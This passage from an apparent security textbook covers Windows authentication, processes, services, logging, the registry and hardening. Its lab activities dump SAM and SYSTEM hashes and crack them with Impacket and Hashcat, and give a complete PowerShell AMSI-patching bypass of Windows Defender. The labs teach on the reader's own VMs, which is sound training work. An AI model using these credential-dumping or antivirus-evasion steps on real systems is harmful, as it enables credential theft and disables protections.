It has since been replaced with the Kerberos system originally developed by MIT.  The system uses symmetric cryptography and a centralized server to distribute keys known as the *key distribution center (KDC)*.  The KDC offers supports three functions to authenticate users.  KDC's *ticket-granting server (TGS)* establishes connections between the principal and the networked service known as the *service server (SS)*.  Principals present their encrypted password over the network to the TGS which compares the value to the account's known encrypted value within a database on the KDC server.  Upon validation, the *authentication server (AS)* completes the authentication and a ticket is created and returned to the principal to be used, presented to, the target network resource.  The SS then also validates this ticket with the KDC.

>[!note] Note - Kerberos System
>There are several well known attacks against Kerberos which are beyond the scope of this text.  Among many other attacks, interested readers may want to look up *pass the ticket*, *silver ticket*, and *golden ticket* attacks.

LM, NTLM, and Kerberos all provide the ability for networked Windows systems to share authentication systems and centralize access management.  But the passwords for these systems must still reside somewhere in the operating system.  The **security accounts manager (SAM)** is a database file that contains the username and hashed passwords for system users.  It is encrypted and access is limited to the SYSTEM user only.  The *local security authority subsystem services (LSASS)* is an executable, owned by the SYSTEM user, facilitates the security policy of the system by handling passwords and sessions.  The LSASS executable can be found in the `/Windows/System32/config/SAM` folder while the database itself is included in the Windows registry under the `HKLM\SAM` hive.

> [!activity] Activity - Cracking SAM
> The SAM database is somewhat analogous to Linux's shadow file.  It ultimately contains the NTLM hash values for all users on the system and requires elevated permissions to access it.  Dumping the values from SAM only provides the NTML hashes which require brute force or dictionary cracking to obtain the plaintext value.  For this demonstration I'll create a test user, extract the SAM database, use a tool Impacket to extract the hash values, and then crack the hashes using the very popular Hashcat tool.
> 
> Starting with the Windows VM, I launch a command prompt as an administrator and accept the UAC prompt.
> ![[../images/05/win_activity_sam_cmd.png|Starting Command Prompt as Admin|500]]
> With the command prompt started, using the `net` utility, I create a user named tester and the weak password `Password123`.  *Even though this password is 10 characters long and includes a mix of alpha-numeric characters as well as a upper and lowercase letters, it uses a common dictionary word and pattern that can be guessed*. 
> ```cmd
> net user /add tester Password123
> ```
> ![[../images/05/win_activity_sam_create_user.png|Create Local User Tester|600]]
> I then sign out as my existing user and login as the tester user.  This action ensures the NTLM hash is registered within SAM.  While logged in as the tester user, I launch another command prompt as administrator, which requires me to enter my local administrator username and password.  Within this new admin command prompt I dump the SAM and SYSTEM entries to the root C drive from the registry using the `reg` command.
> ```cmd
> reg save hklm\sam c:\sam
> reg save hklm\system c:\system
> ```
> ![[../images/05/win_activity_sam_dump.png|Dumping SAM and SYSTEM to C Drive|600]]
> Because I have bi-directional drag and drop setup between my host and the Windows VM, I copy the `sam` and `system` files from the Windows VM to my host.
> ![[../images/05/win_activity_sam_copy.png|Copy SAM/SYSTEM Files to Host|500]]
> Next I start the Kali VM and drag and drop the `sam` and `system` files from my host to Kali's desktop.  There are many ways in which an attacker can exfiltrate data.  We could have shown the creation of a shared network file SMB or FTP service, uploaded to a cloud service, encoded the files and copy and pasted, or several other ways.
> ![[../images/05/win_activity_sam_kali_drop.png|Copy SAM/SYSTEM Onto Kali Desktop|400]]With the `sam` and `system` files in the Kali system I can extract the NTLM hashed passwords using Impacket's secret dump utility.  I open a terminal from the Desktop where the files are stored and point the `-sam` and `-system` options of `impacket-secretsdump` to the files while specifying this is a capture on the local system, as opposed to remote.
> ```bash
> impacket-secretsdump -sam sam -system system LOCAL
> ```
> ![[../images/05/win_activity_sam_impacket.png|Impacket Secrets Dump Output]]
> The dump is successful and outputs a list of principals, their user id, LM, and NTLM hashes (in that order).  I see our target tester user is the last entry with the user id of 1001 and the NTLM hash value `58a478135a93ac3bf058a5ea0e8fdb71`.  I copy this value and paste it into a hash.txt file that will be used as an input to the Hashcat tool.
> ```bash
> echo "58a478135a93ac3bf058a5ea0e8fdb71" > hash.txt
> ```
> ![[../images/05/win_activity_sam_hash.png|Creating Hash File|600]]
> The last step is to attempt to crack the hashed password using Hashcat with the rockyou list.  You may recall we used rockyou in an activity earlier in this chapter.  Hashcat comes with several modes depending on the system or hash type.  Mode 1000 is dedicated for NTLM hashes specifically - the full list of available modes can be found in the manual pages or online.
> ```bash
> hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
> ```
> ![[../images/05/win_activity_sam_hashcat_start.png|Starting Hashcat to Crack NTLM Hash|600]]
> Hashcat starts but will take a few moments to crack the password.  Once completed the tool displays the cracked password!
> ![[../images/05/win_activity_sam_cracked.png|Cracked NTLM Hash with Hashcat|600]]

> [!exercise] Exercise - Cracking SAM
>This task requires the use of the Windows VM as well as the Kali VM, both in Bridge Adapter network mode.  You will create a test user on the Windows VM, exfiltrate the SAM and SYSTEM files onto your Kali VM, and crack the NTLM hash of the user you created.
>#### Step 1 - Create a User
>On the Windows VM, open a command prompt as Administrator and create a user with the password “Password123”.
>```
>net user /add tester Password123
>```
>#### Step 2 - Exfiltrate SAM
>From within the Windows VM command prompt running as Administrator, pull the SAM and SYSTEM databases from the registry.
>```
>reg save hklm\sam c:\sam 
>reg save hklm\system c:\system
>```
>The files were saved to the C drive’s root directory.  Drag and drop them to your host computer.  Once on your host computer, drag and drop (again) the SYSTEM and SAM files to the Kali VM.
>#### Step 3 - Dump and Crack Secrets
>From the Kali VM, with the SAM and SYSTEM files downloaded, dump the NTLM hashes using impacket.  *Note the name of the SAM and SYSTEM files is case sensitive and we named them in lowercase.*
>```
>impacket-secretsdump -sam sam -system system LOCAL
>```
>Copy the NTLM hash for the tester user into a hash.txt file.  Remember to replace `HASH` with the hash value of your tester user as highlighted in the following screenshot.
>```
>echo “HASH” > /tmp/hash.txt
>```
>Crack the password using hashcat and rockyou.txt.
>```
>hashcat -m 1000 /tmp/hash.txt /usr/share/wordlists/rockyou.txt
>```
### Processes
Like Linux, when an executable is ran in Windows a user specific process is created and given a PID.  These PIDs can be nested into the same tree like structure and are accessible via the GUI or command line.

> [!activity] Activity - Windows Processes
> In the Windows VM I can view all running processes by starting the task manager application in the search bar.
> ![[../images/05/win_activity_processes_task_launch.png|Launching Windows Task Manager|400]]
> Once the Task Manager is launched, I press the More Details button in the lower left corner of the window to display all the running processes.  The manager lists each process and their resource consumption, similar to the `top` command in Linux.
> ![[../images/05/win_activity_processes_list.png|Task Manager List|550]]
> I select the first process, `Task Manager`, right-click and select the Properties option in the context menu which opens the process's information.
> ![[../images/05/win_activity_processes_properties.png|Taskmgr Properties Window|350]]
> The properties menu lists the location of the executable being ran along with other general information.  Similar information about processes can be derived from the command prompt using the `tasklist` command.  Here I open a command prompt and run the utility to list the running processes.
> ```cmd
> tasklist
> ```
> ![[../images/05/win_activity_processes_tasklist.png|Process List Using Tasklist|600]]
### Services
Windows maintains services much like Linux services and daemons.  These services running under a user context can be viewed, started and stopped through the built in Services application or via the command line using the `sc` command.

>[!activity] Activity - Windows Services
>Continuing the use of the Windows VM, I search for the Services application in the search bar.
>![[../images/05/win_activity_service_app.png|Launching Windows Services App|400]]
>The Services app lists all the services, regardless of their status, along side information like the status and how it is started.  I've selected the first running service which displays the service's description on the left pane.  I can control the service here by starting or stopping it using the provided links in the left pane. 
>![[../images/05/win_activity_service_list.png|Windows Service List]]
>Similar to the Task Manager app, if I right-click the service and select the Properties option in the context menu it will launch the settings the service has.  These settings include the path to the executable along with any options or flags the executable is being ran with.
>![[../images/05/win_activity_service_properties.png|Service Properties|400]]
>This same information along with the administrative capabilities can be engaged over the command line using the `sc` utility.  I'll start a command line window and use the query command to list all the services on the system.
>```cmd
>sc query
>```
>![[../images/05/win_activity_service_query.png|Querying Services Via Command Prompt|600]]
>A long list of services and their states are displayed.  Just like the Services GUI app, the Appinfo service is the first running service to be displayed.  I can get more information about the service using the `sc` command with the `qc` option specifying the service name.
>```cmd
>sc qc Appinfo
>```
>![[../images/05/win_activity_service_info.png|Appinfo Detail Using SC|600]]
>The command provides additional information that we previously found in the properties window of the Service app.  This information includes the executable path under the key `BINARY_PATH_NAME`.  The service can stopped, started, or modified using the `sc` command as we will see in later chapters.
### Task Scheduler
Remember Cron in the Linux section of this chapter?  Well Windows has a similar service called **Task Scheduler** which is used to schedule executables to be ran on a given schedule or event.  Similar to services and processes the Task Scheduler can be used via the GUI and the CLI.

> [!activity] Activity - Windows Task Scheduler
> The Task Scheduler can be launched using the Windows search bar.  Once launched and the Task Scheduler Library is selected on the left navigation pane tree, a list of tasks are listed in the main pane.  The first job is automatically selected and its details appear in the bottom pane.  The Triggers tab offers a range of schedules and events that will cause the task to launch.  Creating new tasks are as easy as pressing the Create Task button on the right pane and following the wizard.
> ![[../images/05/win_activity_task_scheduler.png|Windows Task Scheduler]]
### Logging
Windows logs events for applications, system, and security contexts which are accessible using the Event Viewer built-in application.  These logs are essential when troubleshooting system issues and for monitoring the security of the system.  They include event descriptions, timestamps, and the associated accounts.  For Windows systems, event types have been cataloged and indexed using standardized numbers.  These numbers can be used as reference points when searching for specific log types.  The Event Viewer empowers administrators to create searches and filters related to the logs they are interested in.

> [!activity] Activity- Windows Event Viewer
> From the search bar I can search and launch the Event Viewer application.  It has a similar layout as the Task Scheduler with a navigation tree in the left pane, event list on the top pane, details pane on the bottom, and a management pane on the right.  Selecting the Security logs under the Windows Logs folder on the left navigation tree displays thousands of events.  I selected the second event with Event ID 4624 which is the security event for a user log on.  The details of the event are displayed in the bottom pane.  Although cut off in the image below, the General tab displays the log on user SYSTEM under the Subject section of the raw details.
> ![[../images/05/win_activity_log_event_viewer.png|Windows Event Viewer]]
> We can also search and display events using PowerShell, but most administrators utilize the Event Viewer application when working with Windows logs.  Security professionals may export these logs into a centralized system for indexing and searching at scale which we will explore later in this textbook.
### Registry
While Linux has the `etc` folder to store system and application configurations, Windows uses the **Registry**.  This system is  a hierarchical database that stores information necessary to configure the system and applications.  Prior to Windows 98, the operating system relied on INI files to store information.  These files were centralized into the Registry for ease of administration among other reasons.  The Registry itself is stored in the following DAT files called *hives*:
- HKEY_LOCAL_MACHINE (alias Software)
- HKEY_CURRENT_CONFIG (alias System)
- HKEY_USERS
Hives contain folders and entries as key value pairs using a data types.  We exported the System hive using the `reg` utility in the previous activity where we cracked an NTLM hashed password.  However, the Registry can also be accessed using the like-named Registry Editor application.

> [!activity] Activity - Windows Registry
> I start the Registry by searching `Registry Editor` in the search bar and launching it as administrator.  The pane on the left is another directory tree and the pane on the right will display the contents of the item chosen from the tree.  I navigate to the `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` section which displays all the applications that are set to run when a user logs in.
> ![[win_activity_registry.png]]
> I can see that Edge and OneDrive are set to launch at log on.  From this application I can add, remove, or modify any application to run at startup.
> 

Malware can abuse the Registry by hiding data and within it used to obfuscate its activity.  The registry can even be used as a persistence mechanism which we will explore further in the next chapter.
### Hardening
Windows hardening follows the same concept as what we explored in the Linux section of this chapter.  Administrators should seek to limit the applications and services installed on a device alongside restricting access as prudent.  Previous chapters we touched upon the host firewall built into the operating system and observed the dangers of disabling it exposing services to the network.  Windows too has security configurations that can be scanned using baseline solutions and those configurations can be more restrictive such as setting password policies.
#### Windows Patching
The Windows operating system is so large, dynamic, and built using legacy code that new security vulnerabilities are constantly being identified.  These vulnerabilities range in severity and Microsoft works diligently to mitigate them using software patches, at least most of the time.  These patches become available the second Tuesday of every month to what has become known as *patch Tuesday*.  These patches include performance, feature, and security fixes with the security patches needing to be applied promptly.  

> [!warning] Warning - Diffing Patches
> As soon as a patch becomes available an arms race between system administrators and malware authors starts.  System administrators must patch their systems quickly to avoid becoming victim of malware that abuses the security vulnerability of an unpatched system.  Malware authors monitor these patch releases and will compare unpatched system files to patched system files to identify the change.  The changes are analyzed to derive the vulnerability and then new malware is developed to exploit the vulnerability.  The time from patch release to malware use abusing the vulnerability has been as fast as 1 or 2 days!

Microsoft releases patches as *knowledge base (KB)* notices and deliver them through their Windows Update distribution channel.  These channels are automatically monitored by Windows versions inside of a support timeframe.  At the time of this writing Windows 7 is no longer supported an thus does not receive (usually) security updates.  Enterprises often use patch management solutions, such as the *Windows Server Update Services (WSUS)* servers, to administer patches in a controlled manner.
#### Anti-Malware
Another hardening activity that is most prevalent with Windows operating systems is the use of anti-malware, or *anti-virus*, solutions.  In fact, Windows comes with a free solution called **Windows Defender** which has grown into a standalone threat monitoring solution.  In the past, Defender did not have good creditability often missing obvious malware, but recent improvements on this service have been substantial and as of now is a reasonable solution for malware mitigation.  Approaches to malware mitigation have grown over time with the first iteration using hash values of malicious binaries and scanning systems searching for these files.  

However, the ability to bypass these early anti-malware solutions required only a slight alteration of the malware creating a new strain.  Solutions then evolved to detect specific patterns within the malware themselves such as the use of Windows API functions and the byte order and position within the executable.  These *signature based* solutions are used today with similar patterns being used in other security systems, like IDS, that we will experiment with in later chapters.  *Behavioral based* anti-malware solutions also exist which monitor the activities of all running processes on the system looking for suspicious activities, like writing files to the system or attempting to interact with LSASS.  All of these solutions usually support monitoring and blocking of malware.  Some go as far as to remove the malware from a device when it is detected.  The following image was taken from VirusTotal when searching the SHA1 hash of the infamous Mimikatz password dumping tool. [^1]  It shows that 61 of 72 antivirus vendors recognize the hash of the file as malware.
![[../images/05/virustotal.png|VirusTotal Mimikatz Detections]]

> [!activity] Activity - Bypassing Defender
> Most anti-malware and *endpoint detection and response (EDR)* solutions hook into the memory space of the every process that is started on the device.  This allows the solution to monitor the processes activity and report back to the solution for handling.  If the hook reports malicious patterns the solution kills the running process ending the malware before it has had a chance to cause impact.  However, when a user initiates an executable its code is put into the *userland* memory space where the anti-malware solution then hooks into.  The userland memory space is in complete control of the user that started the process - allowing them, or the malware, to read and write to that memory.  With this background, malware can unhook the anti-malware solution from the memory space it is running in bypassing the security control.  Instead of unhooking, the malware can also return true negative results back to the solution regardless of the process memory space's behavior.
> 
> I'll demonstrate how to bypass Windows Defender using the Windows VM in a PowerShell session.  After starting the machine, I search for Virus & Threat Protection to launch the Defender settings.
> ![[../images/05/win_activity_launch_defender.png|Launching Windows Defender|400]]
> Scrolling down the Windows Security window I can see that Defender appears to be enabled and running.
> ![[../images/05/win_activity_av_defender_running.png|Defender Up and Running|300]]
> To demonstrate a bypass I need to execute commands in a running process so I launch a PowerShell session from the search bar.  Defender hooks into this newly created process and will monitor the memory space for malicious behavior.  I happen to know that the Windows API function `AmsiScanBuffer` will trigger Defender can kill the command as this function can be abused by malware to bypass Defender.  To test that Defender is working, I'll include this string in an echo command and observe Defender taking action.
> ```powershell
> echo "AmsiScanBuffer"
> ```
> ![[../images/05/win_activity_bypass_test.png|Testing Defender|600]]
> Excellent, we can see that Defender detected the string and blocked the command.  Next I'll run several commands designed to replace the malicious detection result in the running process with a passing result no matter the behavior.  These bypass commands are found on S3cur3Th1sSh1t's GitHub repository Amsi-Bypass-Powershell: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#patching-amsi-amsiscanbuffer-by-rasta-mouse. [^2] There are several bypasses, with varying degrees of effectiveness, and I'll use the Patching AMSI AmsiScanBuffer by rasta-mouse.  If I copy and paste the entire script and attempt to run it in the PowerShell process, Defender will detect it and block the activity.  Therefore, I copy and paste each command one at a time to elude detection.  The first block loads the Windows API kernel library functions needed to manipulate memory space into a variable that I'll use in commands to follow.
> ```powershell
> $Win32 = @"
> 
> using System;
> using System.Runtime.InteropServices;
> 
> public class Win32 {
> 
>     [DllImport("kernel32")]
>     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
> 
>     [DllImport("kernel32")]
>     public static extern IntPtr LoadLibrary(string name);
> 
>     [DllImport("kernel32")]
>     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
> 
> }
> "@
> 
> Add-Type $Win32
> ```
>![[../images/05/win_activity_bypass_functions.png|Importing Kernel Memory Functions|600]]
>In the next command I load the `amsi.dll` library into another variable to use later.  Notice in the command that amsi is broken up into two segments that are concatenated together.  This is to avoid the raw string that would otherwise be detected and blocked by Defender.  This, along with sever other techniques, is a common method to evade signature detection.
>```powershell
>$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
>```
>In order to patch the AmsiScanBuffer process I need to know where it is located in memory.  The GetProcAddress kernel function loaded earlier can assist by return the address of the given function.  However, as we demonstrated earlier, using the raw string will cause Defender to block the command.  Therefore, again we use the concatenate method to evade the signature detection.
>```powershell
>$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
>```
>I'll set a variable to zero that will be used in the following command to allow the AmsiScanBuffer process to be written to.
>```powershell
>$p = 0
>```
>Next, I'll set the the memory space of AmsiScanBuffer to be writable.  The command returns true indicating successful memory change!
>```powershell
>[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
>```
>In the next command I'll set a variable to hold the patch in hexadecimal that will overwrite AmsiScanBuffer to return true negatives.
>```powershell
>$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
>```
>Finally, the last command will write the patch to the AmsiScanBuffer process.  All the preceeding commands can be found in the following screenshot.
>```powershell
>[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
>```
>![[../images/05/win_activity_bypass_commands.png|Patching AmsiScanBuffer Process|600]]
>Amsi should now be defanged for our PowerShell process.  To test its success I will rerun the echo command that was originally blocked.
>```powershell
>echo "AmsiScanBuffer"
>```
>![[../images/05/win_activity_bypass_tested.png|Testing Bypassed Defender|600]]
>Defender didn't block the use of AmsiScanBuffer!  This means anything else ran in this PowerShell process won't be blocked by Defender.

> [!exercise] Exercise - Bypassing Defender
> Using your Windows VM in Bridge Adapter network mode, you will demonstrate an AMSI patch bypass.
> #### Step 1 - Test AMSI
> From the Windows VM, start a PowerShell terminal and prove Windows Defender is running by running the following command.  The result of the command should result in an antivirus block.
> ```
> echo “AmsiScanBuffer”
> ```
> #### Step 2 - Bypass Defender
> Navigate to Rasta Mouse’s AMSI patch.  Copy each line/block into your PowerShell terminal one at a time hitting enter in between.  You can find Rasta’s patch code in the following link. 
> https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#patching-amsi-amsiscanbuffer-by-rasta-mouse 
> Once all lines/blocks are copied, retest to confirm that the PowerShell process is no longer hooked into Windows Defender.
> ```
> echo “AmsiScanBuffer”
> ```
> #### Step 3 - Test Other Bypasses
> Pick another bypass method from the following link and test in a new PowerShell instance.  Can you find another method that works? 
> https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

[^1]: VirusTotal - File; February 2024; https://www.virustotal.com/gui/file/31eb1de7e840a342fd468e558e5ab627bcb4c542a8fe01aec4d5ba01d539a0fc
[^2]: Amsi-Bypass-Powershell; GitHub S3cur3Th1sSh1t; February 2024; https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#patching-amsi-amsiscanbuffer-by-rasta-mouse